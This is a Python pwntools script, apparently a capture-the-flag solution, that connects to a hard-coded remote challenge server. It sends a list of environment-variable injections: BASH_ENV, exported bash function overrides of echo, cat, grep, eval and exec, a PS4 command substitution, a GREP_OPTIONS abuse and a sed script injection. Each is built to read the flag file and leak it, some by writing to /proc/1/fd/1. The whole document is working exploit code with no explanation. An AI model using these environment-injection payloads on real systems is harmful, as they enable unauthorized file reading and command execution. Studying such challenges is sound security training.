#!/usr/bin/env python3
import json
from pwn import *

io = remote('35.242.189.239', 1337)
# io = process(['python3', 'challenge.py'], cwd='environment')
io.recvuntil(b'You may need to shutdown the input (send eof, -N in nc).\n')
io.sendline(json.dumps([
    ['BASH_ENV', 'flag', 'x'],
    ['BASH_FUNC_echo%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_test%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_cat%%', '() { grep F <flag >/proc/1/fd/1; }', 'x'],
    ['BASH_FUNC_grep%%', '() { cat flag >/proc/1/fd/1; }', 'x'],
    ['USE_SED', '1', 'Q/rflag\n#'],
    ['BASH_FUNC_bash%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_set%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_return%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_eval%%', '() { cat flag; }', 'x'],
    ['GREP_OPTIONS', '-fflag', 'flag'],
    ['BASH_FUNC_exec%%', '() { cat flag; }', 'x'],
    ['BASH_FUNC_hash%%', '() { export BASH_ENV=flag; false; }', 'x'],
    # also works:
    # ['BASH_FUNC_hash%%', '() { cat flag >/proc/1/fd/10; }', 'x'],
    ['PS4', '$(cat flag)', 'x'],
    ['BASH_FUNC_command_not_found_handle%%', '() { grep F <flag >/proc/1/fd/1; }', 'x'],
]))
io.shutdown()
io.interactive()
